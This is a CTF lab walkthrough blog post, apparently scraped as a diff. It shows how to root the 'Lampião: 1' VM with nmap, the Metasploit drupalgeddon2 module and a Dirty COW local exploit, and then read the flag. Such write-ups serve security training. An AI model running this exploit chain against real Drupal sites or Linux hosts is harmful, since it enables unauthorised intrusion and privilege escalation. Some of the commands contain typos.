@@ -1,0 +1,218 @@
+
+								
+																		Hack the Lampião: 1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 5, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Lampião: 1”. This VM is developed by Tiago Tavares, which is a standard Boot-to-Root challenge. Our goal is to get into the root directory and see the congratulatory message.
+Level: Easy
+Task: To Find The Final Flag.
+Let’s Breach!!
+The target holds 192.168.1.105 as network IP; now using nmap lets find out open ports.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.105
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.105
+					
+				
+			
+		
+
+
+Nmap scan shows us port 22, 80, 1898 are open, so we thought of opening the IP address along with the port 1898 in our browser. It also gave us a clue about the webpage that it has Drupal running on it.
+
+From the previous clue, we thought of exploiting it by using exploit drupal_drupalgeddon2.
+
+		
+		
+			
+			
+			
+			
+msf &gt; user explot/unix/webapp/drupal_drupalgeddon2
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.105
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit
+			
+				
+					
+				
+					1234
+				
+						msf &gt; user explot/unix/webapp/drupal_drupalgeddon2msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.105msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit
+					
+				
+			
+		
+
+Booyah!! We have got the meterpreter, therefore we thought of checking the description about Victim’s Machine by using the command:
+
+		
+		
+			
+			
+			
+			
+lsb_release -a
+			
+				
+					
+				
+					1
+				
+						lsb_release -a
+					
+				
+			
+		
+
+The description gave us a very strong hint from the Version Number of the Victim’s Machine for our Next Step.
+
+After a long search using the earlier clue about the Version Number, We have finally found the exploit that we were looking for and we have downloaded it on our machine.
+
+Side by Side we have executed a python server which will help us to download the exploit over Victim’s Machine.
+
+We have download this file on server’s /tmp (universal writeable) directory. Since the exploit is in .cpp format, therefore, to compile and execute it, there were specific commands given in the code of the exploit. This gave us a hint on how to compile and execute the exploit 40847.ccp.
+Boom, we got the root shell! Let’s read the flag now.
+
+		
+		
+			
+			
+			
+			
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow
+./dcow -s
+			
+				
+					
+				
+					12
+				
+						g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow./dcow -s
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat flag.txt
+					
+				
+			
+		
+
+
+Author: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. See’s things from a different angle and an out of the box thinker. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
